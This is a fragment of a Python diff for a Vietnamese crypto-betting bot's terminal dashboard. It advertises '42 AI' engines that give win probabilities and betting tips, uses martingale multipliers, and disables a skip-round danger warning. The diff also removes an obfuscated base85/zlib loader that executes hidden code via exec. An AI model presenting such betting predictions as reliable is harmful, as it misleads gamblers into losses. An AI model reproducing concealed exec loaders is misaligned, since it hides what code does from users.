+        body.append(f"{wins:>3} THẮNG  ", style=TST_COLORS["muted"])
+        body.append(f"{tag}\n", style=f"bold {accent}")
+        body.append(f"RỦI RO {risk_pct:4.0f}%  ", style=f"bold {risk_col}")
+        body.append(risk_tag, style=risk_col)
+        body.append("\n")
+        # thanh risk (đầy = rủi ro cao)
+        filled = max(1, min(18, int(risk_pct / 100 * 18)))
+        body.append("━" * filled, style=risk_col)
+        body.append("─" * (18 - filled), style=TST_COLORS["onyx"])
+        cards.append(Panel(body, border_style=accent, box=box.ROUNDED, padding=(0, 1)))
+    for row in range(2):
+        grid.add_row(*cards[row * 3:(row + 1) * 3])
+    return Panel(
+        grid,
+        title=f"[bold {TST_COLORS['sapphire']}]01  BẢNG NHÂN VẬT[/]",
+        subtitle="mục tiêu • vừa thắng • rủi ro mỗi ván",
+        border_style=TST_COLORS["sapphire"],
+        box=box.ROUNDED,
+        padding=(0, 1),
     )
 
-print("[PyHydra] 경고: 이 파일은 난독화되었습니다. "
-      "실행하기 전에 출처를 신뢰할 수 있는지 확인하세요. "
-      "__DOC__['ko'] 를 참조하세요.")
-_문저지 = "".join(c for c in _초리어 if c in _구보기)
-_정루꽃 = base64.b85decode(_문저지)
-_정루꽃 = _안강서(_정루꽃, _저처바)
-_포구너 = zlib.decompress(_정루꽃).decode("utf-8")
 
-exec(compile(_포구너, "<obfuscated>", "exec"))
 
+
+def build_cdtd_mid():
+    body = Text()
+    if False and cdtd_ui_state == "DANGER":  # đã tắt cảnh báo nguy hiểm
+        body.append("⚠ CẢNH BÁO NGUY HIỂM" + chr(10) + chr(10), style=f"bold {TST_COLORS['ruby']}")
+        body.append((cdtd_round_warning or "Phân tích không ổn") + chr(10) + chr(10), style="bold white")
+        body.append("BỎ VÁN NÀY", style=f"bold {TST_COLORS['neon_orange']}")
+        body.append(chr(10) + chr(10) + "Chờ kỳ sau…", style=TST_COLORS["muted"])
+        accent, title = TST_COLORS["ruby"], "02  NGUY HIỂM · BỎ VÁN"
+    elif cdtd_ui_state == "ANALYZING":
+
+        elapsed = time.time() - (cdtd_analysis_start_ts or time.time())
+        progress = min(1.0, elapsed / max(cdtd_analysis_duration, 0.1))
+        filled = int(30 * progress)
+        body.append("LUỒNG QUYẾT ĐỊNH AI\n\n", style=f"bold {TST_COLORS['sapphire']}")
+        body.append("[" + "■"*filled + "·"*(30-filled) + "]\n", style=f"bold {TST_COLORS['neon_pink']}")
+        body.append(f"\n{progress*100:05.1f}%  ", style=f"bold {TST_COLORS['gold']}")
+        body.append(f"Còn {max(0,int(cdtd_analysis_duration-elapsed))}s", style=TST_COLORS["muted"])
+        accent, title = TST_COLORS["sapphire"], "02  AI PHÂN TÍCH"
+    elif cdtd_ui_state == "PREDICTED":
+        bet_amt = cdtd_current_bet or cdtd_base_bet
+        nvs = cdtd_predicted_nvs if cdtd_predicted_nvs else ([cdtd_predicted_nv] if cdtd_predicted_nv else [])
+        names = "  •  ".join(f"{NV_ICONS.get(n,'•')} {NV.get(n,'NV'+str(n))}" for n in nvs) or "N/A"
+        total = bet_amt * max(1, len(nvs))
+        body.append("DỰ ĐOÁN ĐÃ KHÓA\n\n", style=f"bold {TST_COLORS['emerald']}")
+        body.append(names + "\n\n", style="bold white")
+        body.append(f"CƯỢC  {bet_amt:.2f} × {max(1,len(nvs))}\n", style=TST_COLORS["muted"])
+        body.append(f"TỔNG  {total:.2f} {cdtd_coin}", style=f"bold {TST_COLORS['gold']}")
+        accent, title = TST_COLORS["emerald"], "02  KHÓA MỤC TIÊU"
+    elif cdtd_ui_state == "RESULT":
+        last_bet = cdtd_bet_history[-1] if cdtd_bet_history else None
+        win = bool(last_bet and last_bet.get("result") == "win")
+        accent = TST_COLORS["emerald"] if win else TST_COLORS["ruby"] if last_bet else TST_COLORS["gold"]
+        body.append("KẾT THÚC VÁN\n\n", style=f"bold {accent}")
+        if cdtd_previous_issue is not None:
+            body.append(f"KỲ {cdtd_previous_issue} vừa xong\n", style=TST_COLORS["gold"])
+        body.append(
+            f"NV THẮNG  {NV_ICONS.get(cdtd_last_winner, chr(8226))} {NV.get(cdtd_last_winner, 'N/A')}\n\n",
+            style="bold white",
+        )
+        body.append("SẴN SÀNG VÁN SAU", style=TST_COLORS["muted"])
+        title = "02  KẾT QUẢ VÁN"
+    else:
+        accent, title = TST_COLORS["gold"], "02  CHỜ ENGINE"
+        body.append("ĐANG CHỜ DỮ LIỆU ĐUA\n\n", style=f"bold {accent}")
+        body.append("ĐANG KẾT NỐI ENGINE", style=TST_COLORS["muted"])
+    return Panel(Align.center(body, vertical="middle"), title=f"[bold]{title}[/]", border_style=accent, box=box.ROUNDED, padding=(1,2))
+
+
+
+
+def build_cdtd_history():
+    t = Table(show_header=True, box=box.SIMPLE_HEAVY, expand=True, padding=(0,1))
+    t.add_column("KỲ", style=TST_COLORS["muted"], no_wrap=True)
+    t.add_column("MỤC TIÊU")
+    t.add_column("CƯỢC", justify="right", style=TST_COLORS["gold"])
+    t.add_column("KẾT QUẢ", justify="right")
+    rows = list(cdtd_bet_history)[-6:]
+    if not rows:
+        t.add_row("—", "Chưa có", "0.00", Text("CHỜ", style=TST_COLORS["muted"]))
+    for b in rows:
+        res = b.get("result")
+        rc = TST_COLORS["emerald"] if res == "win" else TST_COLORS["ruby"] if res == "lose" else TST_COLORS["gold"]
+        t.add_row(str(b.get("issue","-")), NV.get(b.get("chosen"), str(b.get("chosen","-"))),
+                  f"{b.get('amount',0):.2f}", Text({"win":"THẮNG","lose":"THUA"}.get(str(res), str(res or "CHỜ")).upper(), style=f"bold {rc}"))
+    return Panel(t, title="[bold]03  SỔ CƯỢC[/]", border_style=TST_COLORS["onyx"], box=box.ROUNDED, padding=(0,1))
+
+
+
+
+def build_cdtd_stats():
+    """Performance matrix + RISK mỗi ván."""
+    bundle = _cdtd_risk_bundle()
+    data = bundle.get("top100")
+    risk_by = bundle.get("by_id") or {}
+    rows_risk = bundle.get("rows") or []
+
+    t = Table(show_header=True, box=box.SIMPLE, expand=True, padding=(0, 1))
+    t.add_column("STT", width=3, style=TST_COLORS["muted"])
+    t.add_column("NHÂN VẬT")
+    t.add_column("THẮNG", justify="right", style=TST_COLORS["emerald"])
+    t.add_column("TỶ LỆ", justify="right", style=TST_COLORS["neon_pink"])
+    t.add_column("P(THẮNG)", justify="right")
+    t.add_column("P(THUA)", justify="right")
+    t.add_column("MỨC", justify="center")
+    vals = data[1] if data and len(data) > 1 and data[1] else [0] * 6
+    total = max(1, sum(int(x or 0) for x in vals))
+    for i in range(6):
+        wins = int(vals[i] if i < len(vals) else 0)
+        rr = risk_by.get(i + 1) or {}
+        risk_pct = float(rr.get("risk_pct", 50.0) or 50.0)
+        win_p = float(rr.get("win_prob", 100.0 - risk_pct) or (100.0 - risk_pct))
+        lose_p = float(rr.get("lose_prob", 100.0 - win_p) or (100.0 - win_p))
+        lvl, col = _risk_level(risk_pct)
+        wcol = TST_COLORS["emerald"] if win_p >= 22 else TST_COLORS["neon_orange"] if win_p >= 14 else TST_COLORS["ruby"]
+        lcol = TST_COLORS["ruby"] if lose_p >= 75 else TST_COLORS["neon_orange"] if lose_p >= 60 else TST_COLORS["emerald"]
+        t.add_row(
+            str(i + 1),
+            f"{NV_ICONS.get(i + 1, '•')} {NV.get(i + 1, 'NV' + str(i + 1))}",
+            str(wins),
+            f"{wins / total * 100:.1f}%",
+            Text(f"{win_p:.0f}%", style=f"bold {wcol}"),
+            Text(f"{lose_p:.0f}%", style=f"bold {lcol}"),
+            Text(lvl, style=f"bold {col}"),
+        )
+
+    pnl = user_asset_cdtd().get(cdtd_coin, 0) - cdtd_stats["asset_0"]
+    summary = Text()
+    summary.append("PHIÊN\n", style=f"bold {TST_COLORS['sapphire']}")
+    summary.append(f"VÁN      {cdtd_stats['win'] + cdtd_stats['lose']}\n")
+    summary.append(f"THẮNG    {cdtd_stats['win']}\n", style=TST_COLORS["emerald"])
+    summary.append(f"THUA     {cdtd_stats['lose']}\n", style=TST_COLORS["ruby"])
+    summary.append(f"MAX T    {cdtd_max_win_streak}\n")
+    summary.append(f"MAX B    {cdtd_max_lose_streak}\n")
+    summary.append(
+        f"P&L      {pnl:+.4f} {cdtd_coin}\n",
+        style=f"bold {TST_COLORS['emerald'] if pnl >= 0 else TST_COLORS['ruby']}",
+    )
+    # gợi ý nhanh từ risk
+    if rows_risk:
+        safest = min(rows_risk, key=lambda x: x["risk_pct"])
+        riskiest = max(rows_risk, key=lambda x: x["risk_pct"])
+        best_win = max(rows_risk, key=lambda x: float(x.get("win_prob", 0) or 0))
+        summary.append(chr(10) + "XÁC SUẤT THẮNG / THUA" + chr(10), style=f"bold {TST_COLORS['gold']}")
+        summary.append(
+            f"CAO NHẤT {best_win.get('icon','•')} {best_win.get('name','?')}  P≈{float(best_win.get('win_prob',0)):.0f}%" + chr(10),
+            style=TST_COLORS["emerald"],
+        )
+        summary.append(
+            f"NÊN CƯỢC  {safest.get('icon','•')} {safest.get('name','?')} risk {safest['risk_pct']:.0f}%" + chr(10),
+            style=TST_COLORS["emerald"],
+        )
+        summary.append(
+            f"NÊN TRÁNH {riskiest.get('icon','•')} {riskiest.get('name','?')} risk {riskiest['risk_pct']:.0f}%",
+            style=TST_COLORS["ruby"],
+        )
+
+    return Panel(
+        Columns(
+            [
+                Panel(t, border_style=TST_COLORS["onyx"], box=box.SIMPLE),
+                Panel(summary, border_style=TST_COLORS["gold"], box=box.SIMPLE, padding=(1, 2)),
+            ],
+            equal=True,
+            expand=True,
+        ),
+        title="[bold]04  XÁC SUẤT THẮNG · THUA[/]",
+        border_style=TST_COLORS["sky"],
+        box=box.ROUNDED,
+        padding=(0, 1),
+    )
+
+
+
+
+def build_cdtd_marquee():
+    text = Text()
+    text.append("ENGINE  ", style=f"bold {TST_COLORS['muted']}")
+    text.append(CDTD_ALGORITHMS.get(cdtd_settings.get('algo','RANDOM'),'N/A'), style=f"bold {TST_COLORS['sapphire']}")
+    text.append("   │   ", style=TST_COLORS["onyx"])
+    text.append(f"CƯỢC {cdtd_base_bet} × {cdtd_num_athletes}", style=TST_COLORS["gold"])
+    text.append("   │   ", style=TST_COLORS["onyx"])
+    text.append(f"x{cdtd_multiplier}", style=TST_COLORS["neon_pink"])
+    text.append("   │   ", style=TST_COLORS["onyx"])
+    text.append(f"W {cdtd_stats['win']}  /  L {cdtd_stats['lose']}", style=TST_COLORS["muted"])
+    if cdtd_previous_issue is not None and cdtd_last_winner:
+        text.append("   │   ", style=TST_COLORS["onyx"])
+        text.append(f"VỪA XONG {cdtd_previous_issue}", style=TST_COLORS["gold"])
+        text.append(
+            f" · THẮNG {NV_ICONS.get(cdtd_last_winner, '•')} {NV.get(cdtd_last_winner, cdtd_last_winner)}",
+            style=TST_COLORS["emerald"],
+        )
+    return Panel(Align.center(text), border_style=TST_COLORS["onyx"], box=box.SIMPLE, padding=(0,1))
+
+
+
+
+def cdtd_generate_layout():
+    """CDTD NOVA: bố cục 4 tầng, không còn dashboard cũ."""
+    root = Table.grid(expand=True, pad_edge=False)
+    root.add_row(build_cdtd_header())
+    root.add_row(build_cdtd_marquee())
+
+    middle = Table.grid(expand=True, pad_edge=False)
+    middle.add_column(ratio=60)
+    middle.add_column(ratio=40)
+    middle.add_row(build_cdtd_racers(), build_cdtd_mid())
+    root.add_row(middle)
+
+    root.add_row(build_cdtd_history())
+    root.add_row(build_cdtd_stats())
+    return root
+
+
+def cdtd_prompt_settings():
+    global cdtd_base_bet, cdtd_multiplier, cdtd_coin, cdtd_current_bet, cdtd_pause_rounds
+    global cdtd_bet_rounds_before_skip, cdtd_settings, _key_type, cdtd_num_athletes
+
+    console.clear()
+    brand = Text()
+    brand.append(" ▶▶ ", style=f"bold {TST_COLORS['bg_deep']} on {TST_COLORS['neon_blue']}")
+    brand.append("  CHẠY ĐUA TỐC ĐỘ  ", style=f"bold {TST_COLORS['gold']}")
+    brand.append("  ·  CẤU HÌNH ĐUA  ", style=TST_COLORS["muted"])
+    console.print(Align.center(brand))
+    console.print(Rule(f"[bold {TST_COLORS['neon_blue']}]  ▶  CẤU HÌNH CƯỢC  [/]", style=TST_COLORS["sapphire"]))
+    console.print()
+
+    console.print(Text.assemble(("▌ ", f"bold {TST_COLORS['gold']}"), ("HỆ THỐNG CƯỢC", f"bold {TST_COLORS['gold']}")))
+    coin_choice = Prompt.ask(
+        f"  [{TST_COLORS['muted']}]Tiền tệ[/{TST_COLORS['muted']}] [bold {TST_COLORS['gold']}]1[/]=USDT  [bold {TST_COLORS['neon_blue']}]2[/]=BUILD  [bold {TST_COLORS['neon_pink']}]3[/]=WORLD",
+        choices=["1","2","3"], default="2"
+    )
+    cdtd_coin = {"1":"USDT","2":"BUILD","3":"WORLD"}[coin_choice]
+    cdtd_base_bet = FloatPrompt.ask(f"  Cược gốc ({cdtd_coin})", default=1.0)
+    cdtd_multiplier = FloatPrompt.ask("  Hệ số nhân", default=2.0)
+    cdtd_current_bet = cdtd_base_bet
+    cdtd_num_athletes = int(IntPrompt.ask("  Số nhân vật [1-5]", choices=["1","2","3","4","5"], default=str(cdtd_num_athletes or 1)))
+    cdtd_bet_rounds_before_skip = IntPrompt.ask("  Bỏ qua sau N ván (0=tắt)", default=0)
+    cdtd_pause_rounds = IntPrompt.ask("  Tạm dừng N ván sau thua (0=tắt)", default=0)
+
+    available = get_available_cdtd_ai_list(_key_type)
+    console.print()
+    console.print(Rule(f"[bold {TST_COLORS['sapphire']}]  ◉  ENGINE AI  ·  {len(available)} KHẢ DỤNG  [/]", style=TST_COLORS["accent_line"]))
+    t = Table(show_header=True, box=box.SIMPLE_HEAVY, expand=True, padding=(0,1))
+    t.add_column("#", width=4, style=TST_COLORS["muted"])
+    t.add_column("ENGINE", style=f"bold {TST_COLORS['platinum']}")
+    for i, k in enumerate(available, 1):
+        row_style = TST_COLORS["sapphire"] if i % 2 == 0 else TST_COLORS["neon_pink"]
+        t.add_row(Text(str(i), style=f"bold {row_style}"), CDTD_ALGORITHMS.get(k, k))
+    console.print(t)
+    idx = IntPrompt.ask(
+        f"  [bold {TST_COLORS['gold']}]▶ Chọn engine[/bold {TST_COLORS['gold']}]",
+        choices=[str(i) for i in range(1, len(available)+1)], default=1
+    )
+    cdtd_settings["algo"] = available[idx-1]
+
+    console.print()
+    console.print(Rule(style=TST_COLORS["accent_line"]))
+    if Prompt.ask(f"  [bold {TST_COLORS['neon_orange']}]◈ Tích hợp Telegram (y/n)[/bold {TST_COLORS['neon_orange']}]", choices=["y","n"], default="n") == "y":
+        setup_telegram()
+    console.print()
+    console.print(Panel(
+        Text.assemble(
+            ("✓  ĐÃ LƯU CẤU HÌNH\n", f"bold {TST_COLORS['emerald']}"),
+            ("ENGINE  ", TST_COLORS["muted"]),
+            (CDTD_ALGORITHMS.get(cdtd_settings['algo'], cdtd_settings['algo']), f"bold {TST_COLORS['gold']}"),
+        ),
+        border_style=TST_COLORS["emerald"],
+        box=box.SIMPLE,
+        padding=(0, 2),
+    ))
+    time.sleep(0.8)
+    return True
+
+
+def main_cdtd_v3():
+    console.clear()
+    brand = Text()
+    brand.append(" ▶▶ ", style=f"bold {TST_COLORS['bg_deep']} on {TST_COLORS['neon_blue']}")
+    brand.append("  CHẠY ĐUA TỐC ĐỘ  ", style=f"bold {TST_COLORS['platinum']}")
+    brand.append("·  ENGINE 42 AI ĐUA", style=TST_COLORS["muted"])
+    console.print(Panel(
+        Align.center(brand),
+        border_style=TST_COLORS["neon_blue"],
+        box=box.HEAVY_HEAD,
+        padding=(0, 1),
+    ))
+    console.print(Align.center(Text("◈ Support: @tst-tool88  ·  42 AI  ·  Telegram", style=TST_COLORS["muted"])))
+    console.print()
+    
+    data = load_data_cdtd()
+    setup_cdtd_headers(data)
+    
+    if not cdtd_prompt_settings():
+        return
+    
+    console.clear()
+    console.print(f"[bold {TST_COLORS['neon_orange']}]🏎️ KHỞI ĐỘNG VỚI 42 AI...[/]")
+    
+    with console.status(f"[bold {TST_COLORS['gold']}]🔍 Đang kiểm tra...[/]", spinner="dots"):
+        asset = user_asset_cdtd()
+        time.sleep(1)
+    
+    if asset.get(cdtd_coin, 0) <= 0:
+        console.print(f'[red]❌ Số dư {cdtd_coin} = 0![/]')
+        time.sleep(2)
+        return
+    
+    console.print(f'[green]✅ Số dư: {asset[cdtd_coin]:.4f} {cdtd_coin}[/]')
+    if TELEGRAM_ENABLED:
+        console.print(f'[green]✅ Telegram: BẬT[/]')
+    
+    time.sleep(2)
+    cdtd_game_loop()
+    
+    console.clear()
+    final_asset = user_asset_cdtd()
+    pnl = final_asset.get(cdtd_coin, 0) - cdtd_stats['asset_0']
+    pnl_col = TST_COLORS["emerald"] if pnl >= 0 else TST_COLORS["ruby"]
+    sum_grid = Table.grid(expand=True, padding=(0, 3))
+    sum_grid.add_column(ratio=1); sum_grid.add_column(ratio=1); sum_grid.add_column(ratio=1)
+    sum_grid.add_row(
+        Panel(Text.assemble(("THẮNG\n", TST_COLORS["muted"]), (str(cdtd_stats['win']), f"bold {TST_COLORS['emerald']}")), border_style=TST_COLORS["emerald"], box=box.SIMPLE, padding=(0,2)),
+        Panel(Text.assemble(("THUA\n",  TST_COLORS["muted"]), (str(cdtd_stats['lose']), f"bold {TST_COLORS['ruby']}")),   border_style=TST_COLORS["ruby"],    box=box.SIMPLE, padding=(0,2)),
+        Panel(Text.assemble(("P&L\n",   TST_COLORS["muted"]), (f"{pnl:+.4f} {cdtd_coin}", f"bold {pnl_col}")),             border_style=pnl_col,                 box=box.SIMPLE, padding=(0,2)),
+    )
+    summary = Panel(
+        Group(
+            Align.center(Text("◈  TỔNG KẾT PHIÊN  ◈", style=f"bold {TST_COLORS['gold']}")),
+            Rule(style=TST_COLORS["accent_line"]),
+            sum_grid,
+        ),
+        border_style=TST_COLORS["gold"],
+        box=box.HEAVY_HEAD,
+        padding=(0, 1),
+    )
+    console.print(summary)
+    console.print("\n[dim]Nhấn Enter để quay lại menu...[/]")
+    input()
+    # ================== LOGO / CẤU HÌNH / GAME FLOW ==================
+
+def build_logo_with_gradient(logo: str) -> Text:
+    """Render logo với màu gradient vàng."""
+    text = Text()
+    colors = [
+        TST_COLORS["gold"],
+        TST_COLORS["gold_dark"],
+        TST_COLORS["neon_orange"],
+        TST_COLORS["gold"],
+    ]
+    lines = logo.split("\n")
+    for i, line in enumerate(lines):
+        if not line.strip():
+            text.append("\n")
+            continue
+        color = colors[i % len(colors)]
+        text.append(line + "\n", style=f"bold {color}")
+    return text
+
+
+def save_strategy_config() -> bool:
+    """Lưu cấu hình chiến lược ra file."""
+    global base_bet, multiplier, run_mode, bet_rounds_before_skip, num_rooms
+    global pause_after_losses, profit_target, stop_when_profit_reached
+    global stop_loss_target, stop_when_loss_reached, analysis_duration, settings
+    try:
+        cfg = {
+            "algo": settings.get("algo", "ENSEMBLE"),
+            "base_bet": base_bet,
+            "num_rooms": num_rooms,
+            "multiplier": multiplier,
+            "run_mode": run_mode,
+            "bet_rounds_before_skip": bet_rounds_before_skip,
+            "pause_after_losses": pause_after_losses,
+            "profit_target": profit_target,
+            "stop_when_profit_reached": stop_when_profit_reached,
+            "stop_loss_target": stop_loss_target,
+            "stop_when_loss_reached": stop_when_loss_reached,
+            "analysis_duration": analysis_duration,
+        }
+        with open(STRATEGY_CONFIG_FILE, "w", encoding="utf-8") as f:
+            json.dump(cfg, f, indent=2, ensure_ascii=False)
+        console.print(f"[green]✅ Đã lưu cấu hình vào {STRATEGY_CONFIG_FILE}[/green]")
+        return True
+    except Exception as e:
+        console.print(f"[red]❌ Lỗi lưu config: {e}[/red]")
+        return False
+
+
+def load_strategy_config() -> bool:
+    """Load cấu hình chiến lược từ file."""
+    global base_bet, multiplier, run_mode, bet_rounds_before_skip, num_rooms
+    global pause_after_losses, profit_target, stop_when_profit_reached
+    global stop_loss_target, stop_when_loss_reached, analysis_duration, settings, current_bet, _key_type
+    if not os.path.exists(STRATEGY_CONFIG_FILE):
+        console.print(f"[yellow]⚠️ Chưa có file {STRATEGY_CONFIG_FILE}. Hãy SAVE CONFIG trước.[/yellow]")
+        return False
+    try:
+        with open(STRATEGY_CONFIG_FILE, "r", encoding="utf-8") as f:
+            cfg = json.load(f)
+        loaded_algo = cfg.get("algo", settings.get("algo", "RANDOM"))
+        available = get_available_ai_list(_key_type)
+        if loaded_algo not in available:
+            loaded_algo = available[0] if available else "RANDOM"
+            console.print(f"[yellow]⚠️ AI trong config không khả dụng với key {_key_type} → dùng {loaded_algo}[/yellow]")
+        settings["algo"] = loaded_algo
+        base_bet = float(cfg.get("base_bet", base_bet))
+        num_rooms = int(cfg.get("num_rooms", num_rooms or 1))
+        multiplier = float(cfg.get("multiplier", multiplier))
+        run_mode = cfg.get("run_mode", run_mode)
+        bet_rounds_before_skip = int(cfg.get("bet_rounds_before_skip", bet_rounds_before_skip))
+        pause_after_losses = int(cfg.get("pause_after_losses", pause_after_losses))
+        profit_target = cfg.get("profit_target")
+        stop_when_profit_reached = bool(cfg.get("stop_when_profit_reached", False))
+        stop_loss_target = cfg.get("stop_loss_target")
+        stop_when_loss_reached = bool(cfg.get("stop_when_loss_reached", False))
+        analysis_duration = float(cfg.get("analysis_duration", analysis_duration))
+        current_bet = base_bet
+        console.print(f"[green]✅ Đã load config: AI={settings['algo']} | Cược={base_bet} | x{multiplier}[/green]")
+        return True
+    except Exception as e:
+        console.print(f"[red]❌ Lỗi load config: {e}[/red]")
+        return False
+
+
+def prompt_settings() -> bool:
+    global base_bet, multiplier, run_mode, bet_rounds_before_skip, num_rooms
+    global pause_after_losses, profit_target, stop_when_profit_reached
+    global stop_loss_target, stop_when_loss_reached, analysis_duration, settings, current_bet, _key_type
+
+    console.clear()
+    brand = Text()
+    brand.append(" ♛ ", style=f"bold {TST_COLORS['bg_deep']} on {TST_COLORS['emerald']}")
+    brand.append("  VUA THOÁT HIỂM  ", style=f"bold {TST_COLORS['platinum']}")
+    brand.append("·  STRATEGY CONFIG", style=TST_COLORS["muted"])
+    console.print(Panel(Align.center(brand), border_style=TST_COLORS["emerald"], box=box.HEAVY_HEAD, padding=(0,1)))
+    console.print()
+
+    console.print(Text.assemble(("▌ ", f"bold {TST_COLORS['gold']}"), ("HỆ THỐNG CƯỢC", f"bold {TST_COLORS['gold']}")))
+    base_bet = FloatPrompt.ask(f"  [{TST_COLORS['muted']}]Cược gốc (BUILD)[/{TST_COLORS['muted']}]", default=float(base_bet or 1.0))
+    multiplier = FloatPrompt.ask(f"  [{TST_COLORS['muted']}]Hệ số nhân[/{TST_COLORS['muted']}]", default=float(multiplier or 2.0))
+    num_rooms = int(IntPrompt.ask(
+        f"  [{TST_COLORS['muted']}]Số phòng mỗi ván [1-4][/{TST_COLORS['muted']}]",
+        choices=["1", "2", "3", "4"],
+        default=str(num_rooms or 1),
+    ))
+    current_bet = base_bet
+    run_mode = "AUTO" if Prompt.ask(
+        f"  [{TST_COLORS['muted']}]Mode[/{TST_COLORS['muted']}] [bold {TST_COLORS['gold']}]1[/]=AUTO  [bold {TST_COLORS['sapphire']}]2[/]=MANUAL",
+        choices=["1","2"], default="1"
+    ) == "1" else "MANUAL"
+
+    console.print()
+    console.print(Rule(f"[bold {TST_COLORS['ruby']}]  ◈  KIỂM SOÁT RỦI RO  [/]", style=TST_COLORS["accent_line"]))
+    bet_rounds_before_skip = IntPrompt.ask(f"  [{TST_COLORS['muted']}]Bỏ qua sau N ván (0=tắt)[/{TST_COLORS['muted']}]", default=int(bet_rounds_before_skip or 0))
+    pause_after_losses = IntPrompt.ask(f"  [{TST_COLORS['muted']}]Tạm dừng N ván sau thua (0=tắt)[/{TST_COLORS['muted']}]", default=int(pause_after_losses or 0))
+    analysis_duration = FloatPrompt.ask(f"  [{TST_COLORS['muted']}]Analysis duration (seconds)[/{TST_COLORS['muted']}]", default=float(analysis_duration or 45.0))
+
+    stop_when_profit_reached = Prompt.ask(
+        f"  [bold {TST_COLORS['emerald']}]◈ Profit target (y/n)[/bold {TST_COLORS['emerald']}]", choices=["y","n"], default="n"
+    ) == "y"
+    profit_target = FloatPrompt.ask(f"  [{TST_COLORS['muted']}]Target BUILD[/{TST_COLORS['muted']}]", default=0.0) if stop_when_profit_reached else None
+    stop_when_loss_reached = Prompt.ask(
+        f"  [bold {TST_COLORS['ruby']}]◈ Stop loss (y/n)[/bold {TST_COLORS['ruby']}]", choices=["y","n"], default="n"
+    ) == "y"
+    stop_loss_target = FloatPrompt.ask(f"  [{TST_COLORS['muted']}]Loss threshold BUILD[/{TST_COLORS['muted']}]", default=0.0) if stop_when_loss_reached else None
+
+    available = get_available_ai_list(_key_type)
+    console.print()
+    console.print(Rule(f"[bold {TST_COLORS['sapphire']}]  ◉  ENGINE AI  ·  {len(available)} KHẢ DỤNG  [/]", style=TST_COLORS["accent_line"]))
+    ai_table = Table(show_header=True, box=box.SIMPLE_HEAVY, expand=True, padding=(0,1))
+    ai_table.add_column("#", width=4, style=TST_COLORS["muted"])
+    ai_table.add_column("ENGINE", style=f"bold {TST_COLORS['platinum']}")
+    for i, k in enumerate(available, 1):
+        row_col = TST_COLORS["sapphire"] if i % 2 == 0 else TST_COLORS["neon_pink"]
+        ai_table.add_row(Text(str(i), style=f"bold {row_col}"), SELECTION_MODES.get(k, k))
+    console.print(ai_table)
+    idx = IntPrompt.ask(
+        f"  [bold {TST_COLORS['gold']}]▶ Chọn engine[/bold {TST_COLORS['gold']}]",
+        choices=[str(i) for i in range(1, len(available)+1)], default=1
+    )
+    settings["algo"] = available[idx-1]
+
+    console.print()
+    console.print(Rule(style=TST_COLORS["accent_line"]))
+    if Prompt.ask(
+        f"  [bold {TST_COLORS['neon_orange']}]◈ Tích hợp Telegram (y/n)[/bold {TST_COLORS['neon_orange']}]",
+        choices=["y","n"], default="n"
+    ) == "y":
+        setup_telegram()
+    console.print()
+    console.print(Panel(
+        Text.assemble(
+            ("✓  ĐÃ LƯU CẤU HÌNH\n", f"bold {TST_COLORS['emerald']}"),
+            ("ENGINE  ", TST_COLORS["muted"]),
+            (SELECTION_MODES.get(settings['algo'], settings['algo']), f"bold {TST_COLORS['gold']}"),
+            (f"  ·  {num_rooms} phòng", TST_COLORS["muted"]),
+        ),
+        border_style=TST_COLORS["emerald"],
+        box=box.SIMPLE,
+        padding=(0, 2),
+    ))
+    time.sleep(0.8)
+    return True
+
+
+
+
+
+def _vth_active_issue():
+    """Kỳ VTH đang chờ kết quả (pending) hoặc kỳ hiện tại."""
+    try:
+        for b in reversed(list(bet_history)):
+            res = str(b.get("result") or "").strip().lower()
+            if res in ("đang", "dang", "pending", "wait", "chờ", "cho", "") and b.get("issue") is not None:
+                try:
+                    return int(b["issue"])
+                except Exception:
+                    return b["issue"]
+    except Exception:
+        pass
+    return issue_id
+
+
+def build_vth_header():
+    """Header VTH giống CDTD — Text 2 dòng, không dùng \\n markup lỗi."""
+    asset_build = current_build if current_build is not None else 0.0
+    pnl = cumulative_profit if cumulative_profit is not None else 0.0
+    pnl_color = TST_COLORS["emerald"] if pnl >= 0 else TST_COLORS["ruby"]
+    title = Text()
+    title.append("VTH", style=f"bold {TST_COLORS['emerald']}")
+    title.append("  /  ", style=TST_COLORS["muted"])
+    title.append("ĐIỀU KHIỂN THOÁT HIỂM", style=f"bold {TST_COLORS['platinum']}")
+    title.append("   TRỰC TIẾP", style=f"bold {TST_COLORS['emerald']}")
+    cells = [
+        ("USER", str(USER_ID or "N/A"), TST_COLORS["sapphire"]),
+        ("SỐ DƯ", f"{asset_build:,.4f} BUILD", TST_COLORS["gold"]),
+        ("P&L", f"{pnl:+,.4f}", pnl_color),
+        ("CHUỖI", f"{win_streak}T / {lose_streak}B", TST_COLORS["neon_pink"]),
+        ("KEY", str(_key_type).upper(), TST_COLORS["sky"]),
+        ("KỲ", str(_vth_active_issue() or "—"), TST_COLORS["muted"]),
+    ]
+    g = Table.grid(expand=True, padding=(0, 1))
+    for _ in cells:
+        g.add_column(ratio=1)
+    g.add_row(*[
+        Text.from_markup(f"[bold {c}]{label}[/]" + chr(10) + f"[bold white]{value}[/]")
+        for label, value, c in cells
+    ])
+    return Group(
+        Align.center(title),
+        Rule(style=TST_COLORS["emerald"]),
+        Panel(g, border_style=TST_COLORS["onyx"], box=box.SIMPLE, padding=(0, 1)),
+    )
+
+
+def build_vth_marquee():
+    algo_name = SELECTION_MODES.get(settings.get("algo", "RANDOM"), settings.get("algo", "?"))
+    text = Text()
+    text.append("ENGINE  ", style=f"bold {TST_COLORS['muted']}")
+    text.append(str(algo_name), style=f"bold {TST_COLORS['emerald']}")
+    text.append("   │   ", style=TST_COLORS["onyx"])
+    text.append(f"CƯỢC {base_bet} × {max(1, int(num_rooms or 1))}", style=TST_COLORS["gold"])
+    text.append("   │   ", style=TST_COLORS["onyx"])
+    text.append(f"x{multiplier}", style=TST_COLORS["neon_pink"])
+    text.append("   │   ", style=TST_COLORS["onyx"])
+    text.append(f"T {win_streak}  /  B {lose_streak}", style=TST_COLORS["muted"])
+    if count_down is not None:
+        text.append("   │   ", style=TST_COLORS["onyx"])
+        text.append(f"ĐẾM {count_down}s", style=TST_COLORS["sky"])
+    text.append("   │   ", style=TST_COLORS["onyx"])
+    st = str(_ws_status or "…")
+    if st.startswith("✅"):
+        text.append(st[:28], style=TST_COLORS["emerald"])
+    elif st.startswith("❌"):
+        text.append(st[:28], style=TST_COLORS["ruby"])
+    else:
+        text.append(st[:28], style=TST_COLORS["gold"])
+    if last_finished_issue is not None:
+        text.append("   │   ", style=TST_COLORS["onyx"])
+        text.append(f"VỪA XONG {last_finished_issue}", style=TST_COLORS["gold"])
+        if last_finished_label:
+            text.append(f" · SÁT THỦ {last_finished_label}", style=TST_COLORS["ruby"])
